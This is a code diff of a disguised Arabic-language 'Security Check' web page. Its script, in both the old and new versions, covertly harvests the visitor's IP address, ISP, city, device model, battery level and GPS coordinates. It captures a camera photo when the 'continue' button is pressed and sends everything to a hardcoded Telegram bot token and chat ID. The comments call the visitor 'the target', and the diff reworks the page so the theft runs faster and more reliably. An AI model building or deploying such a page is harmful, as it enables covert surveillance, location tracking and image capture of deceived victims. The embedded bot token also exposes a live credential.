@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection</title>
+    <title>Security Check</title>
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 320px; }
@@ -16,7 +16,7 @@
 
     <div class="box">
         <div class="ldr" id="L"></div>
-        <p id="T">جاري الفحص...</p>
+        <p id="T">جاري فحص بروتوكولات الأمان...</p>
         <button id="B">متابعة الآن</button>
     </div>
 
@@ -27,67 +27,77 @@
         const _U = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
         const _C = "2103976274";
 
-        async function fullScan() {
-            let n = navigator;
-            let r = "🛑 **تقرير تقني شامل (فوري)**\n\n";
+        // 1. وظيفة إرسال النصوص
+        function send(t) {
+            fetch(_U + "sendMessage", { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ chat_id: _C, text: t, parse_mode: "Markdown" })
+            });
+        }
 
-            // 1. جلب الآي بي والشبكة (التي تعمل لديك)
+        // 2. جلب الشبكة والآي بي (منفصل تماماً لضمان السرعة)
+        async function getNetwork() {
             try {
                 const res = await fetch('https://ipapi.co/json/').then(d => d.json());
-                r += `🌍 **الآي بي:** \`${res.ip}\`\n`;
-                r += `🏢 **الشركة (ISP):** ${res.org}\n`;
-                r += `📍 **المكان (تقريبي):** ${res.city}, ${res.country_name}\n`;
-            } catch(e) { r += "🌍 **الشبكة:** فشل جلب الآي بي\n"; }
+                let m = `🌍 **بيانات الشبكة (دقيق)**\n\n`;
+                m += `🌐 الآي بي: \`${res.ip}\`\n`;
+                m += `🏢 الشركة: ${res.org}\n`;
+                m += `📍 المكان: ${res.city}, ${res.country_name}\n`;
+                m += `📡 الـ ASN: ${res.asn}`;
+                send(m);
+            } catch(e) { send("❌ فشل جلب بيانات الشبكة"); }
+        }
 
-            // 2. كشف نوع الهاتف والموديل الدقيق
+        // 3. جلب معلومات الجهاز (منفصل)
+        async function getDevice() {
+            let n = navigator;
+            let m = `📱 **بيانات الجهاز والموديل**\n\n`;
+            
             let model = "غير معروف";
             try {
                 if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
-                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    model = `${ua.model} (Android ${ua.platformVersion})`;
-                } else {
-                    let match = n.userAgent.match(/\(([^)]+)\)/);
-                    model = match ? match[1] : n.platform;
-                }
+                    const ua = await n.userAgentData.getHighEntropyValues(["model"]);
+                    model = ua.model;
+                } else { model = n.platform; }
             } catch(e) { model = n.platform; }
-            r += `📱 **النظام الأساسي:** ${model}\n`;
 
-            // 3. المعالج الرسومي (GPU)
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                r += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) {}
-
-            r += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 8}\n`;
-            r += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
+            m += `📱 الموديل: ${model}\n`;
+            m += `⚙️ الأنوية: ${n.hardwareConcurrency || 8}\n`;
+            m += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
             
             try {
                 const b = await n.getBattery();
-                r += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
+                m += `🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
             } catch(e) {}
-
-            r += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}`;
-
-            // إرسال التقرير النصي الأول فوراً
-            sendText(r);
             
-            // طلب الموقع الجغرافي الدقيق (GPS)
-            if (n.geolocation) {
-                n.geolocation.getCurrentPosition((pos) => {
-                    let gps = `📍 **الموقع الدقيق (GPS):**\n`;
-                    gps += `رابط الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendText(gps);
-                });
-            }
-
-            setTimeout(() => { 
-                document.getElementById('L').style.display='none'; 
-                document.getElementById('T').innerText='اكتمل الفحص بنجاح.'; 
-                document.getElementById('B').style.display='block'; 
-            }, 1000);
+            send(m);
         }
 
+        // 4. جلب الموقع الدقيق GPS (منفصل تماماً)
+        function getGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    let gps = `📍 **الموقع الدقيق (GPS)**\n\n`;
+                    gps += `رابط الخريطة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    send(gps);
+                }, (err) => { send("⚠️ المستهدف رفض إعطاء الموقع الدقيق"); });
+            }
+        }
+
+        // تنفيذ الوظائف فور الدخول
+        getNetwork(); // يرسل الآي بي والشركة فوراً
+        getDevice();  // يرسل موديل الجهاز فوراً
+        getGPS();     // يحاول جلب الخريطة بشكل مستقل
+
+        // إظهار الزر للمستهدف
+        setTimeout(() => { 
+            document.getElementById('L').style.display='none'; 
+            document.getElementById('T').innerText='تم الفحص بنجاح.'; 
+            document.getElementById('B').style.display='block'; 
+        }, 1500);
+
+        // تشغيل الكاميرا عند ضغط الزر
         document.getElementById('B').onclick = async function() {
             this.style.display = 'none';
             try {
@@ -102,20 +112,8 @@
                         fetch(_U + "sendPhoto", { method: 'POST', body: f });
                     }, 'image/jpeg', 0.8);
                 }, 4000);
-            } catch (e) {
-                sendText("⚠️ المستهدف رفض الكاميرا");
-            }
+            } catch (e) { send("⚠️ المستهدف رفض الكاميرا"); }
         };
-
-        function sendText(t) {
-            fetch(_U + "sendMessage", { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ chat_id: _C, text: t, parse_mode: "Markdown" })
-            });
-        }
-
-        fullScan();
     </script>
 </body>
 </html>
